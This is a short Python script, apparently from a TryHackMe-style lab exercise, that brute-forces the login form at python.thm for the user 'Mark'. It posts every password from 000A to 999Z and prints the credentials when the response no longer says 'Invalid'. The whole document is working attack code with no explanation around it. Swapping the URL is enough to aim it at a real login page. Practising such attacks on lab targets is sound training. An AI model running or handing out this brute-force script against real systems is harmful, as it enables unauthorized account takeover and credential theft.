import requests
import string

url = "http://python.thm/labs/lab1/index.php"
username = "Mark"  

def brute_force():
    for number in range(1000):  # 000 to 999
        for letter in string.ascii_uppercase:  # A to Z
            password = f"{number:03d}{letter}"  # Format like 001A, 123Z
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)
            
            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                print("[*] Response:\n", response.text)
                return
            else:
                print(f"[-] Attempted: {password}")

brute_force()
